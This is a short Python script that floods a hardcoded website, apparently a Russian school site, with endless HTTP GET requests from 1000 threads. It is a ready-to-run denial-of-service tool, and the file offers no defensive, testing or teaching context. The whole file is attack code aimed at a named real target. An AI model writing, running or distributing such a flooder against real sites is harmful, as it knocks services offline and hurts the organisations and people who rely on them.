import colorama
import threading
import requests


def dos(target):
    while True:
        try:
            res = requests.get(target)
            print("\nRequest sent!")
        except requests.exceptions.ConnectionError:
            print("\nConnection error!")


threads = 1000

url = "https://sch2.ru/"

if threads == 0:
    exit("Threads count is incorrect!")

if not url.__contains__("http"):
    exit("URL doesnt contains http or https!")

if not url.__contains__("."):
    exit("Invalid domain")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " thread started!")
